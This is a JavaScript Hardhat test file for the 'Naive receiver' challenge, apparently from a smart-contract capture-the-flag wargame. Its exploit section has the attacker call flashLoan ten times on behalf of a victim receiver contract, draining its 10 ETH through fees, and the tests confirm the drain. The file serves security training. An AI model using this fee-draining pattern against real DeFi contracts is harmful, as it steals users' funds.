const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Naive receiver', async () => {
    let deployer, user, attacker, pool;

    // Pool has 1000 ETH in balance
    const ETHER_IN_POOL = ethers.utils.parseEther('1000');

    // Receiver has 10 ETH in balance
    const ETHER_IN_USER_CONTRACT = ethers.utils.parseEther('10');

    beforeEach(async () => {
    //before(async () => {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, user, attacker] = await ethers.getSigners();

        const LenderPoolFactory = await ethers.getContractFactory('NaiveReceiverLenderPool', deployer);
        const FlashLoanReceiverFactory = await ethers.getContractFactory('FlashLoanReceiver', deployer);

        pool = await LenderPoolFactory.deploy();
        await deployer.sendTransaction({ to: pool.address, value: ETHER_IN_POOL });
        
        userContract = await FlashLoanReceiverFactory.deploy(pool.address);
        await deployer.sendTransaction({ to: userContract.address, value: ETHER_IN_USER_CONTRACT });
    });

    describe('Initial values', async () => {
        it('Pool should have the correct amount of ether', async () => {
            expect(await ethers.provider.getBalance(pool.address)).to.be.equal(ETHER_IN_POOL);
        });

        it('Pool fixed fee should be 1 ether', async () => {
            expect(await pool.fixedFee()).to.be.equal(ethers.utils.parseEther('1'));
        });

        it('User should have the correct amount of ether', async () => {
            expect(await ethers.provider.getBalance(userContract.address)).to.be.equal(ETHER_IN_USER_CONTRACT);
        });
    });

    describe('Exploit', async () => {
        /** CODE YOUR EXPLOIT HERE */
        beforeEach(async () => {
            for (let index = 0; index < 10; index++) {
                await pool.connect(attacker).flashLoan(userContract.address, ethers.utils.parseEther("0"));
            }
        });

        it('User balance should be 0', async () => {
            expect(await ethers.provider.getBalance(userContract.address)).to.be.equal('0');
        });

        it('Pool balance should be pool balance + user balance', async () => {
            expect(await ethers.provider.getBalance(pool.address)).to.be.equal(ETHER_IN_POOL.add(ETHER_IN_USER_CONTRACT));
        });
    });
});
